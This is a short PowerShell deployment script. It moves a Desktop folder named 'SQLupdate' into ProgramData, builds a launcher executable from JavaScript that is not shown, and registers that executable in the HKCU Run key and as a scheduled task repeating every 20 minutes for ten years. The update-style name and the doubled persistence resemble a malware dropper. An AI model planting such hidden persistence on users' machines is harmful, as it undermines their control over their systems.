$source = "$env:USERPROFILE\Desktop\SQLupdate"
$destination = "$env:ProgramData"
$dataFolder = "$destination\SQLupdate\data"

if (Test-Path -Path $source) {

    Copy-Item -Path $source -Destination $destination -Recurse -Force
    Remove-Item -Path $source -Recurse -Force

    Write-Host "[*] SUCCESS: Folder moved to $destination\SQLupdate" -ForegroundColor Green

    if (Test-Path -Path "$dataFolder\launcher.js") {

        Write-Host "[*] Starting build for launcher.exe..." -ForegroundColor Yellow

        Set-Location -Path $dataFolder

        npx.cmd pkg .\launcher.js --targets node18-win-x64 --output .\dist\launcher.exe

        Write-Host "[*] SUCCESS: Build complete, saved to dist\launcher.exe" -ForegroundColor Green

        # --- Автозагрузка ---
        $exePath = "$dataFolder\dist\launcher.exe"
        $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

        Set-ItemProperty `
            -Path $runKey `
            -Name "SQLupdateLauncher" `
            -Value "`"$exePath`"" `
            -Force

        Write-Host "[*] SUCCESS: Added to HKCU Startup Registry" -ForegroundColor Green


        # --- Планировщик ---
        $taskName = "SQLupdateLauncherTask"

        $action = New-ScheduledTaskAction `
            -Execute $exePath

        $trigger = New-ScheduledTaskTrigger `
            -Once `
            -At (Get-Date) `
            -RepetitionInterval (New-TimeSpan -Minutes 20) `
            -RepetitionDuration (New-TimeSpan -Days 3650)

        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries

        Register-ScheduledTask `
            -TaskName $taskName `
            -Trigger $trigger `
            -Action $action `
            -Settings $settings `
            -User "$env:USERDOMAIN\$env:USERNAME" `
            -Force | Out-Null

        Write-Host "[*] SUCCESS: Scheduled task created (runs every 20 minutes)" -ForegroundColor Green

    }
    else {
        Write-Host "[ERROR] launcher.js not found in $dataFolder" -ForegroundColor Red
    }

}
else {
    Write-Host "[ERROR] Source folder $source not found!" -ForegroundColor Red
}